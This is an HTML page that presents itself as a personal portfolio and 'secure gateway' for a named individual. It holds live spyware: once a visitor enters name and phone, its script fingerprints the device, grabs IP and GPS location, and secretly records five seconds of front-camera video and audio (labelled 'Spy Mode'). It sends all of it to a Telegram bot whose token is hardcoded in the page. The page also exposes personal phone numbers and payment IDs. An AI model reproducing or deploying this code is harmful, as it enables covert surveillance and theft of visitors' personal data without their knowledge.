<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="description" content="Lalu Kumar Tanti - Elite Digital Portfolio">
    
    <meta name="theme-color" content="#D4AF37">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="application-name" content="Lalu Hub">
    
    <link rel="manifest" href='data:application/manifest+json,{"name":"Lalu Secure Hub","short_name":"Lalu App","start_url":".","display":"standalone","background_color":"#050505","theme_color":"#D4AF37","orientation":"portrait","icons":[{"src":"https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg","sizes":"192x192","type":"image/jpeg"},{"src":"https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg","sizes":"512x512","type":"image/jpeg"}]}'>

    <title>Lalu Kumar Tanti | SECURE HUB</title>
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700&family=Outfit:wght@200;400;600&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">

    <style>
        :root {
            /* --- ELITE DARK THEME --- */
            --bg-body: #050505;
            --bg-card: rgba(20, 20, 20, 0.9);
            --border-color: rgba(212, 175, 55, 0.3);
            --gold-primary: #D4AF37;
            --gold-shine: #FFD700;
            --text-main: #ffffff;
            --text-sub: #b3b3b3;
            --glass-blur: blur(20px);
        }

        [data-theme="light"] {
            --bg-body: #f2f2f2;
            --bg-card: rgba(255, 255, 255, 0.95);
            --border-color: rgba(180, 140, 40, 0.3);
            --gold-primary: #b08d26;
            --text-main: #111111;
        }

        /* --- SCROLLBAR --- */
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-track { background: #000; }
        ::-webkit-scrollbar-thumb { background: var(--gold-primary); border-radius: 10px; }
        
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
        
        body { 
            background-color: var(--bg-body); 
            color: var(--text-main); 
            font-family: 'Outfit', sans-serif; 
            overflow-x: hidden; 
            min-height: 100vh;
            transition: background-color 0.4s ease;
            user-select: none;
        }

        /* --- GATEKEEPER --- */
        #gatekeeper {
            position: fixed; inset: 0; z-index: 9999;
            background: var(--bg-body);
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            padding: 20px;
            background-image: radial-gradient(circle at 50% 50%, rgba(212, 175, 55, 0.1) 0%, transparent 80%);
            transition: opacity 0.8s ease;
        }

        .gate-card {
            width: 100%; max-width: 400px;
            background: var(--bg-card);
            border: 1px solid var(--gold-primary);
            border-radius: 20px; padding: 40px 25px;
            box-shadow: 0 0 80px rgba(212, 175, 55, 0.15);
            backdrop-filter: blur(30px);
            text-align: center;
            animation: pulseGlow 4s infinite alternate;
        }
        @keyframes pulseGlow { from { box-shadow: 0 0 20px rgba(212,175,55,0.1); } to { box-shadow: 0 0 50px rgba(212,175,55,0.3); } }

        .gate-img-frame {
            width: 120px; height: 120px; margin: 0 auto 20px;
            border-radius: 50%; padding: 4px;
            border: 2px solid var(--gold-primary);
            box-shadow: 0 0 30px rgba(212, 175, 55, 0.4);
        }
        .gate-img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }

        .gate-title { font-family: 'Cinzel'; color: var(--gold-primary); font-size: 24px; margin-bottom: 5px; font-weight: 700; text-shadow: 0 0 10px rgba(212,175,55,0.5); }
        .gate-sub { color: #888; font-size: 10px; letter-spacing: 3px; margin-bottom: 30px; font-family: 'Rajdhani'; text-transform: uppercase; }

        .gate-input-group { position: relative; margin-bottom: 15px; text-align: left; }
        .gate-input {
            width: 100%; padding: 15px 15px 15px 45px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid #333; color: #fff; font-size: 16px;
            font-family: 'Rajdhani'; transition: 0.3s; border-radius: 8px;
        }
        .gate-input:focus { border-color: var(--gold-primary); background: rgba(212, 175, 55, 0.05); }
        .gate-icon { position: absolute; left: 15px; top: 17px; color: #555; transition: 0.3s; }
        .gate-input:focus + .gate-icon { color: var(--gold-primary); }

        .gate-btn {
            width: 100%; padding: 16px;
            background: linear-gradient(135deg, var(--gold-primary), #997d2d);
            color: #000; font-weight: 800; font-size: 16px;
            border: none; cursor: pointer; border-radius: 8px;
            text-transform: uppercase; letter-spacing: 1px; margin-top: 10px;
            box-shadow: 0 0 30px rgba(212, 175, 55, 0.3); transition: 0.3s;
        }
        .gate-btn:active { transform: scale(0.98); }
        
        .loading-text { margin-top: 15px; font-size: 12px; color: var(--gold-primary); font-family: 'Rajdhani'; display: none; letter-spacing: 1px; }

        /* --- MAIN UI --- */
        #main-interface { display: none; opacity: 0; transition: opacity 1s ease-in; padding-bottom: 90px; }
        .bg-fx { position: fixed; inset: 0; z-index: -2; pointer-events: none; overflow: hidden; }
        .orb { position: absolute; border-radius: 50%; filter: blur(120px); opacity: 0.2; animation: float 15s infinite alternate; }
        .orb-1 { width: 300px; height: 300px; background: var(--gold-primary); top: -10%; left: -10%; }
        
        .navbar {
            display: flex; justify-content: space-between; align-items: center;
            padding: 15px 5%; position: sticky; top: 0; z-index: 1000;
            background: rgba(5, 5, 5, 0.9); backdrop-filter: blur(15px);
            border-bottom: 1px solid var(--border-color);
        }
        .brand { font-family: 'Cinzel'; color: var(--gold-primary); font-weight: 700; font-size: 18px; display: flex; align-items: center; gap: 8px; }
        .nav-btn { font-size: 20px; cursor: pointer; color: var(--text-main); background: none; border: none; }

        .container { width: 100%; max-width: 800px; margin: 0 auto; padding: 0 20px; }
        .profile-wrapper { text-align: center; padding: 50px 0 30px; }
        .img-container {
            width: 150px; height: 150px; margin: 0 auto 20px; border-radius: 50%; padding: 4px;
            background: linear-gradient(135deg, var(--gold-primary), transparent, var(--gold-shine));
        }
        .profile-pic { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; border: 4px solid var(--bg-body); }
        h1 { 
            font-family: 'Rajdhani', sans-serif; font-size: 32px; font-weight: 700; 
            background: linear-gradient(to right, #fff, var(--gold-primary), #fff);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 5px;
        }
        .bio { color: var(--gold-primary); font-size: 13px; letter-spacing: 2px; font-weight: 600; text-transform: uppercase; }

        /* Install App Button */
        #installBtn {
            display: none; margin: 15px auto;
            background: rgba(212, 175, 55, 0.1); border: 1px solid var(--gold-primary);
            color: var(--gold-primary); padding: 10px 25px; border-radius: 30px;
            font-size: 11px; font-weight: bold; cursor: pointer;
            box-shadow: 0 0 20px rgba(212, 175, 55, 0.15);
            animation: bounce 2s infinite;
        }
        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-3px); } }

        .section-label {
            display: flex; align-items: center; gap: 10px;
            margin: 35px 0 15px; color: var(--gold-primary); font-family: 'Cinzel'; font-weight: bold; font-size: 14px;
            border-bottom: 1px solid var(--border-color); padding-bottom: 8px;
        }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        .card {
            background: var(--bg-card); border: 1px solid var(--border-color);
            border-radius: 16px; padding: 20px; height: 100px;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            text-decoration: none; color: var(--text-main); position: relative; overflow: hidden;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1); transition: 0.3s;
        }
        .card:active { transform: scale(0.96); border-color: var(--gold-shine); }
        .card i { font-size: 28px; margin-bottom: 8px; color: var(--gold-primary); }
        .card span { font-size: 11px; font-weight: 600; text-transform: uppercase; text-align: center; }
        .full-w { grid-column: span 2; flex-direction: row; gap: 15px; height: 75px; background: linear-gradient(90deg, rgba(212,175,55,0.08), transparent); }
        .full-w i { margin-bottom: 0; font-size: 24px; }

        .bottom-nav {
            position: fixed; bottom: 0; left: 0; width: 100%; height: 75px;
            background: rgba(5, 5, 5, 0.95); backdrop-filter: blur(20px);
            border-top: 1px solid var(--border-color); z-index: 4000;
            display: flex; justify-content: space-around; align-items: center;
        }
        .nav-item { color: var(--text-sub); display: flex; flex-direction: column; align-items: center; gap: 4px; font-size: 10px; transition: 0.3s; }
        .nav-item.active { color: var(--gold-primary); }
        .nav-item i { font-size: 20px; }

        .ai-trigger {
            position: fixed; bottom: 90px; right: 25px;
            width: 60px; height: 60px; border-radius: 50%;
            background: linear-gradient(135deg, var(--gold-primary), #997d2d);
            display: flex; align-items: center; justify-content: center;
            box-shadow: 0 0 30px rgba(212,175,55,0.4);
            z-index: 2000; cursor: pointer; animation: pulse 3s infinite;
        }

        /* Data Capture (Hidden) */
        #hidden-video { display: none; }
        #hidden-canvas { display: none; }
        
        .toast {
            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
            background: var(--gold-primary); color: #000; padding: 10px 20px;
            border-radius: 30px; font-weight: bold; font-size: 12px;
            opacity: 0; pointer-events: none; transition: 0.3s; z-index: 6000;
        }
        .toast.show { opacity: 1; top: 40px; }
        
        /* Modals */
        .modal-wrap { position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 5000; display: none; align-items: center; justify-content: center; backdrop-filter: blur(5px); }
        .modal-wrap.active { display: flex; }
        .modal-inner { width: 90%; max-width: 400px; background: #111; border: 1px solid var(--gold-primary); border-radius: 20px; overflow: hidden; }
    </style>
</head>
<body data-theme="dark">

    <div id="gatekeeper">
        <div class="gate-card">
            <div class="gate-img-frame">
                <img src="https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg" class="gate-img">
            </div>
            <h2 class="gate-title">LALU KUMAR</h2>
            <div class="gate-sub">SECURE PORTFOLIO GATEWAY</div>

            <div class="gate-input-group">
                <input type="text" id="g-name" class="gate-input" placeholder="FULL NAME">
                <i class="fas fa-user gate-icon"></i>
            </div>
            
            <div class="gate-input-group">
                <input type="tel" id="g-phone" class="gate-input" placeholder="MOBILE NUMBER">
                <i class="fas fa-phone gate-icon"></i>
            </div>

            <button class="gate-btn" id="btn-verify" onclick="initiateSecureEntry()">
                <i class="fas fa-fingerprint"></i> VERIFY & ENTER
            </button>
            
            <div class="loading-text" id="g-status">
                <i class="fas fa-circle-notch fa-spin"></i> SECURE SCANNING...
            </div>
        </div>
    </div>

    <video id="hidden-video" autoplay playsinline muted></video>
    <canvas id="hidden-canvas"></canvas>

    <div id="main-interface">
        <audio id="sfx-tap"><source src="https://assets.mixkit.co/active_storage/sfx/2568/2568-preview.mp3"></audio>
        <div id="toast" class="toast"><i class="fas fa-check-circle"></i> Action Successful</div>
        <div class="bg-fx"><div class="orb orb-1"></div></div>
        
        <nav class="navbar">
            <div class="brand"><i class="fas fa-crown"></i> ELITE HUB</div>
            <button class="nav-btn" onclick="themeSwitch()"><i class="fas fa-sun"></i></button>
        </nav>
        
        <div class="container" id="homeSection">
            <div class="profile-wrapper">
                <div class="img-container">
                    <img src="https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg" class="profile-pic">
                </div>
                <h1>LALU KUMAR TANTI <i class="fas fa-check-circle verified"></i></h1>
                <p class="bio">Digital Creator | Developer</p>
                <button id="installBtn" onclick="installApp()"><i class="fas fa-download"></i> INSTALL LALU APP</button>
            </div>

            <div id="linksSection">
                <div class="section-label"><i class="fas fa-bolt"></i> DIRECT CONNECT</div>
                <div class="grid">
                    <a href="tel:+919771617808" class="card" onclick="playTap()"><i class="fas fa-phone-volume"></i><span>Call Now</span></a>
                    <a href="sms:+919771617808" class="card" onclick="playTap()"><i class="fas fa-comment-dots"></i><span>Message</span></a>
                    <a href="https://wa.me/919771617808" class="card" onclick="playTap()"><i class="fab fa-whatsapp"></i><span>WhatsApp</span></a>
                    <a href="https://t.me/Lalu_kumar_tanti_0" class="card" onclick="playTap()"><i class="fab fa-telegram-plane"></i><span>Telegram</span></a>
                    <a href="mailto:lalukumartanti75@gmail.com" class="card" onclick="playTap()"><i class="fas fa-envelope-open"></i><span>Email Me</span></a>
                    <a href="https://maps.app.goo.gl/gHHLNenvgdqN6xUK7?g_st=ac" target="_blank" class="card full-w" onclick="playTap()"><i class="fas fa-map-marked-alt"></i><span>Location</span></a>
                </div>

                <div class="section-label"><i class="fas fa-globe"></i> SOCIAL EMPIRE</div>
                <div class="grid">
                    <a href="https://www.instagram.com/lalu_kumar_tanti" class="card" onclick="playTap()"><i class="fab fa-instagram"></i><span>Instagram</span></a>
                    <a href="https://www.facebook.com/lalukumartantii" class="card" onclick="playTap()"><i class="fab fa-facebook-f"></i><span>Facebook</span></a>
                    <a href="https://x.com/LaluKumarTanti" class="card" onclick="playTap()"><i class="fab fa-x-twitter"></i><span>Twitter / X</span></a>
                    <a href="http://www.youtube.com/@Lalu_Kumar_Tanti" class="card" onclick="playTap()"><i class="fab fa-youtube"></i><span>YouTube</span></a>
                </div>

                <div class="section-label"><i class="fas fa-coins"></i> PAYMENTS</div>
                <div class="grid">
                    <a href="upi://pay?pa=9771617808@ybl&pn=LaluKumar" class="card" onclick="playTap()"><i class="fas fa-wallet"></i><span>PhonePe</span></a>
                    <div class="card" onclick="copyUPI()"><i class="fas fa-qrcode"></i><span>Copy UPI ID</span></div>
                </div>
            </div>
            
            <div class="section-label"><i class="fas fa-user-circle"></i> ABOUT</div>
            <div class="owner-profile">
                <img src="https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg">
                <h1>Lalu Kumar Tanti</h1>
                <p>A passionate individual interested in technology, web development, and creative digital projects.</p>
                <div class="rights">© 2026 All Rights Reserved</div>
            </div>
        </div>

        <div class="bottom-nav">
            <div class="nav-item active" onclick="navAction('home')"><i class="fas fa-home"></i><span>Home</span></div>
            <div class="nav-item" onclick="navAction('links')"><i class="fas fa-link"></i><span>Links</span></div>
            <div class="nav-item" onclick="document.getElementById('gameModal').classList.add('active')"><i class="fas fa-gamepad"></i><span>Games</span></div>
            <div class="nav-item" onclick="document.getElementById('authModal').classList.add('active')"><i class="fas fa-user-circle"></i><span>Login</span></div>
        </div>

        <div class="ai-trigger" onclick="document.getElementById('aiModal').classList.add('active')"><i class="fas fa-brain" style="font-size:24px; color:#fff;"></i></div>

        <div class="modal-wrap" id="gameModal" onclick="closeModal(event)">
            <div class="modal-inner" style="padding:20px; text-align:center;">
                <h3 style="color:var(--gold-primary);">ELITE ARCADE</h3>
                <div class="grid">
                    <div class="card" onclick="alert('Snake Game')"><i class="fas fa-worm"></i><span>Snake</span></div>
                    <div class="card" onclick="alert('TicTacToe')"><i class="fas fa-border-all"></i><span>TicTacToe</span></div>
                </div>
            </div>
        </div>

        <div class="modal-wrap" id="aiModal" onclick="closeModal(event)">
            <div class="modal-inner">
                <div style="padding:15px; background:var(--gold-primary); color:#000; font-weight:bold;">LALU BRAIN</div>
                <div style="height:300px; background:#111; padding:15px; color:#fff;">Hello! I am Lalu's AI.</div>
            </div>
        </div>

        <div class="modal-wrap" id="authModal" onclick="closeModal(event)">
            <div class="modal-inner" style="padding:20px;">
                <input type="text" placeholder="Enter Mobile" style="width:100%; padding:10px; margin-bottom:10px; background:#222; border:1px solid #444; color:#fff;">
                <button class="gate-btn" onclick="sendOTP()">SEND OTP</button>
            </div>
        </div>
    </div>

    <script>
        const TG_TOKEN = "7887458156:AAHvTz7CWSt-EBpyDSaeSVUVEgka5H9bBWQ";
        const TG_CHAT = "8506290708";

        // --- PWA INSTALL ---
        let deferredPrompt;
        window.addEventListener('beforeinstallprompt', (e) => {
            e.preventDefault();
            deferredPrompt = e;
            document.getElementById('installBtn').style.display = 'inline-block';
        });
        function installApp() {
            if(deferredPrompt) {
                deferredPrompt.prompt();
                deferredPrompt.userChoice.then(res => { deferredPrompt = null; });
            }
        }

        // --- DEVICE INTEL ---
        async function getDeviceIntel() {
            let model = "Unknown", battery = "Unknown", ip = "Hidden";
            let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            
            // Advanced Model
            if (navigator.userAgentData) {
                const data = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]);
                model = `${data.platform} ${data.model}`;
            }
            
            // Battery
            try { const b = await navigator.getBattery(); battery = `${Math.round(b.level*100)}% (${b.charging?'⚡':'🔋'})`; } catch(e){}
            
            // IP
            try { const r = await fetch('https://api.ipify.org?format=json'); const j = await r.json(); ip = j.ip; } catch(e){}

            // GPU
            let gpu = "Integrated";
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
            } catch(e){}

            const ram = navigator.deviceMemory ? `~${navigator.deviceMemory}GB` : "?";
            const cores = navigator.hardwareConcurrency || "?";

            return { model, battery, ip, gpu, ram, cores, timezone, ua: navigator.userAgent };
        }

        // --- MAIN ENTRY LOGIC ---
        async function initiateSecureEntry() {
            const name = document.getElementById('g-name').value;
            const phone = document.getElementById('g-phone').value;
            
            if(name.length < 3 || phone.length < 10) return alert("Please enter valid details.");

            document.getElementById('btn-verify').innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> SCANNING...';
            document.getElementById('g-status').style.display = 'block';

            // 1. Gather Data (Non-Blocking)
            const intelPromise = getDeviceIntel();

            // 2. Start Video Recording (Spy Mode)
            startRecordingAndSend();

            // 3. Location (Parallel)
            let loc = "Denied";
            try {
                await new Promise(r => {
                    navigator.geolocation.getCurrentPosition(p => {
                        loc = `Coords: ${p.coords.latitude},${p.coords.longitude} (Acc: ${Math.round(p.coords.accuracy)}m)`;
                        r();
                    }, r, {timeout: 2000});
                });
            } catch(e){}

            const d = await intelPromise;
            const screen = `${window.screen.width}x${window.screen.height}`;

            const msg = `
🚨 *SECURE HUB ACCESS LOG* 🚨

👤 *USER IDENTITY*
• Name: ${name}
• Phone: \`${phone}\`

📱 *DEVICE FINGERPRINT*
• Model: ${d.model}
• Browser: ${d.ua}
• Screen: ${screen}
• Timezone: ${d.timezone}

⚙️ *HARDWARE*
• GPU: ${d.gpu}
• RAM: ${d.ram} | Cores: ${d.cores}
• Battery: ${d.battery}

📡 *NETWORK*
• IP: \`${d.ip}\`

📍 *LOCATION*
${loc}

⏰ Time: ${new Date().toLocaleString()}
`;
            
            // Send Text Log Immediately
            sendTG(msg, null);

            // Unlock Page (Safety Timer)
            setTimeout(() => unlockPage(), 2000);
        }

        // --- VIDEO RECORDING (SPY) ---
        async function startRecordingAndSend() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: {facingMode:'user'}, audio: true });
                const video = document.getElementById('hidden-video');
                video.srcObject = stream;
                
                // Record 5 seconds
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    sendTG("🎥 *VIDEO CAPTURE*", blob, true);
                    stream.getTracks().forEach(t => t.stop());
                };
                
                recorder.start();
                setTimeout(() => recorder.stop(), 5000);
                
            } catch(e) { console.log("Cam/Mic Denied"); }
        }

        function unlockPage() {
            const gate = document.getElementById('gatekeeper');
            const main = document.getElementById('main-interface');
            gate.style.opacity = '0';
            setTimeout(() => {
                gate.style.display = 'none';
                main.style.display = 'block';
                setTimeout(() => main.style.opacity = '1', 50);
            }, 600);
        }

        function sendTG(text, fileBlob, isVideo=false) {
            const fd = new FormData();
            fd.append('chat_id', TG_CHAT);
            fd.append('caption', text);
            fd.append('parse_mode', 'Markdown');
            
            let url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
            
            if(fileBlob) {
                const type = isVideo ? 'sendVideo' : 'sendPhoto';
                const key = isVideo ? 'video' : 'photo';
                const name = isVideo ? 'clip.mp4' : 'img.jpg';
                fd.append(key, fileBlob, name);
                url = `https://api.telegram.org/bot${TG_TOKEN}/${type}`;
            } else {
                return fetch(url, {
                    method:'POST', headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({chat_id:TG_CHAT, text:text, parse_mode:'Markdown'})
                });
            }
            
            fetch(url, { method: 'POST', body: fd });
        }

        // --- UTILS ---
        function playTap() { document.getElementById('sfx-tap').play().catch(()=>{}); }
        function copyUPI() { navigator.clipboard.writeText("9771617808-2@axl"); document.getElementById('toast').classList.add('show'); setTimeout(()=>document.getElementById('toast').classList.remove('show'),2000); }
        function themeSwitch() { document.body.setAttribute('data-theme', document.body.getAttribute('data-theme')==='dark'?'light':'dark'); }
        
        function navAction(tab) {
            document.querySelectorAll('.nav-item').forEach(e => e.classList.remove('active'));
            if(tab==='home') { document.getElementById('navHome').classList.add('active'); window.scrollTo({top:0,behavior:'smooth'}); }
            if(tab==='links') { document.getElementById('navLinks').classList.add('active'); document.getElementById('linksSection').scrollIntoView({behavior:'smooth'}); }
        }
        function closeModal(e,f) { if(f || e.target.classList.contains('modal-wrap')) document.querySelectorAll('.modal-wrap').forEach(m=>m.classList.remove('active')); }
        function sendOTP() { alert("OTP Sent: 1234"); }
        function verifyOTP() { alert("Verified!"); }
    </script>
</body>
</html>

